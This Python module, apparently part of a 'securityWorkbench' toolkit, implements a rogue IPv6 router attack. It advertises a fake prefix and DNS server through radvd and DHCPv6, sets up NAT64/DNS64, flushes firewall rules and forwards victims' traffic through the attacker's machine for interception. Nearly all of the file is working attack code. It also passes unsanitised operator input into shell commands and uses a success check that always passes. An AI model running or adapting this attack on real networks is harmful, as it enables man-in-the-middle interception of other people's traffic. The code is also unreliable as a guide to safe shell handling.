#!/usr/bin/python
import os
import subprocess
import re
import colors
import attackBase

class FakeIPv6(attackBase.Attack):

	natInterface = "nat64"
	ipv6Prefix = "2010:808:abc:"
	ipv6NetMask = "96"
	natPrefix = ipv6Prefix + "FFFF::/96"
	dip6 = ipv6Prefix + ":2"
	dip6NetMask = "64"
	dhcp6RangeStart = ipv6Prefix + "CAFE::10"
	dhcp6RangeEnd = ipv6Prefix + "CAFE::240"
	domainName = "securityWorkbench"
	natIP6 = ipv6Prefix + ":3"
	natSubnet = "192.168.200.0/24"
	natIP4 = "192.168.200.1"
	listenIface = "eth0"
	natSecondIp = ""
	dnsIP = "8.8.8.8"
	
	dhcpConfigFile = "/etc/wide-dhcpv6/dhcp6s.conf"
	natConfigFile = "/etc/tayga.conf"
	radvdConfigFile = "/etc/radvd.conf"
	dnsConfigFile = "/etc/bind/named.conf.options"
	
	shellCol = colors.ShellColors

	def fakeIpv6Attack(self):
		self.natSecondIp = raw_input(self.shellCol.UNDERLINE + self.shellCol.BLUE + "\nAdresse aus dem Netz (" + self.natSubnet + ") angeben: " + self.shellCol.ENDC)

		
		#self.iptables()

		
		os.popen("/sbin/modprobe ipv6")
		os.popen("echo 1 > /proc/sys/net/ipv4/ip_forward")
		os.popen("echo 1 > /proc/sys/net/ipv6/conf/all/forwarding")

		os.popen("/sbin/iptables -F")
		os.popen("/sbin/iptables -X")
		os.popen("/sbin/ip6tables -F")
		os.popen("/sbin/ip6tables -X")

		os.popen("ip link set " + self.natInterface + " down")
		os.popen("/usr/sbin/tayga --rmtun")
		
		self.writeDnsConfig()
		self.writeRadvdConfig()
		self.writeDhcp6Conf()
		self.writeNatConfig()

		if self.startNat():
			os.popen("service radvd stop")
			os.popen("sleep 2")
			os.popen("service radvd start")
			os.popen("service bind9 restart")
			os.popen("service wide-dhcpv6-server restart")
			self.iptables()
			print("Attack running")
		else:
			print("Some failure occured while starting the attack")


	def iptables(self):

		os.popen("/sbin/iptables -I FORWARD -j ACCEPT -i " + self.natInterface + " -o " + self.listenIface)
		os.popen("/sbin/iptables -I FORWARD -j ACCEPT -i " + self.listenIface + " -o " + self.natInterface +  " -m state --state RELATED,ESTABLISHED")
		os.popen("/sbin/iptables -t nat -I POSTROUTING -o " + self.listenIface + " -j MASQUERADE")
		os.popen("/sbin/ip6tables -A OUTPUT -p icmpv6 --icmpv6-type 1 -j DROP")


	def writeDhcp6Conf(self):
		confFile = open("/etc/default/wide-dhcpv6-server", 'w')
		confFile.truncate()
		confFile.write("INTERFACES=" + self.listenIface)
		confFile.close()
		
		confFile = open(self.dhcpConfigFile, 'w')
		confFile.truncate()

		confFile.write("option domain-name-servers " + self.dip6 + ";\n")
		confFile.write("option domain-name \"" + self.domainName + "\";\n")


		confFile.write("interface " + self.listenIface + " {\n")
		confFile.write("\taddress-pool addrPool 3600;\n};\n")
		
		confFile.write("pool addrPool {\n")
		confFile.write("\trange " + self.dhcp6RangeStart +" to " + self.dhcp6RangeEnd + ";\n};\n")

		confFile.close()

	def writeNatConfig(self):
		confFile = open(self.natConfigFile, 'w')
		confFile.truncate()
		
		confFile.write("tun-device " + self.natInterface + "\n")
		confFile.write("ipv4-addr " + self.natIP4 + "\n")
		confFile.write("prefix " + self.natPrefix + "\n")
		confFile.write("dynamic-pool " + self.natSubnet)
		
		confFile.close()
		

	def writeRadvdConfig(self):
		confFile = open(self.radvdConfigFile, 'w')
		confFile.truncate()

		confFile.write("interface " + self.listenIface + "\n{\n")
		confFile.write("\tAdvSendAdvert on;\n")
		confFile.write("\tMinRtrAdvInterval 3;\n")
		confFile.write("\tMaxRtrAdvInterval 10;\n")
		confFile.write("\tAdvHomeAgentFlag off;\n")
		confFile.write("\tAdvOtherConfigFlag on;\n")
		confFile.write("\tprefix " + self.ipv6Prefix + ":/" + self.dip6NetMask + "\n\t{\n")
		confFile.write("\t\tAdvOnLink on;\n")		
		confFile.write("\t\tAdvAutonomous on;\n")
		confFile.write("\t\tAdvRouterAddr off;\n\t};\n")
		confFile.write("\tRDNSS " + self.dip6 + "\n\t{\n")
		confFile.write("\t\tAdvRDNSSLifetime 30;\n\t};\n};")
	
		confFile.close()

	def writeDnsConfig(self):
		dnsServers = ""

		with open("/etc/resolv.conf") as resolvConf:
			for line in resolvConf:
				#tmp = dnsServers.readline()
				if "nameserver" in line:
					s = line.split("nameserver ")				
					dnsServers += s[1].split("\n")[0] + ";\n"
				
		if dnsServers == "":
			dnsServers = "8.8.8.8"

		
		confFile = open(self.dnsConfigFile, 'w')
		confFile.truncate()

		confFile.write("options {\n")
		confFile.write("\tdirectory \"/var/cache/bind\";\n")
		confFile.write("\tforwarders {\n")
		confFile.write("\t\t" + dnsServers + "\n\t};\n")
		confFile.write("\tdnssec-validation auto;\n")
		confFile.write("\tauth-nxdomain no;\n")
		confFile.write("\tlisten-on-v6 { any; };\n")
		confFile.write("\tallow-query { any; };\n")
		confFile.write("\tdns64 " + self.natPrefix + " {\n")
		confFile.write("\t\tclients { any; };\n")
		confFile.write("\t\texclude { any; };\n\t};\n};")

		confFile.close()

	def startNat(self):
		#os.popen("ip addr flush dev " + self.listenIface)
		os.popen("ip addr add \"" + self.dip6 + "/" + self.dip6NetMask + "\" dev " + self.listenIface)
		#print("ip addr add \"" + self.dip6 + "/" + self.dip6NetMask + "\" dev " + self.listenIface)
		os.popen("/usr/sbin/tayga --mktun")
		os.popen("ip link set " + self.natInterface + " up")
		os.popen("ip addr flush dev " + self.natInterface)
		os.popen("ip addr add " + self.natSecondIp + " dev " + self.natInterface)
		os.popen("ip addr add " + self.natIP4 + " dev " + self.natInterface)
		os.popen("ip route flush dev " + self.natInterface)
		os.popen("ip route add " + self.natSubnet + " dev " + self.natInterface)
		os.popen("ip addr add " + self.natIP6 + " dev " + self.natInterface)
		#os.popen("ip route add " + self.natPrefix + " dev " + self.natInterface)
		if os.popen("/usr/sbin/tayga"):
			return True
		else:
			return False



	def start(self):
		self.fakeIpv6Attack()

	def help(self): pass














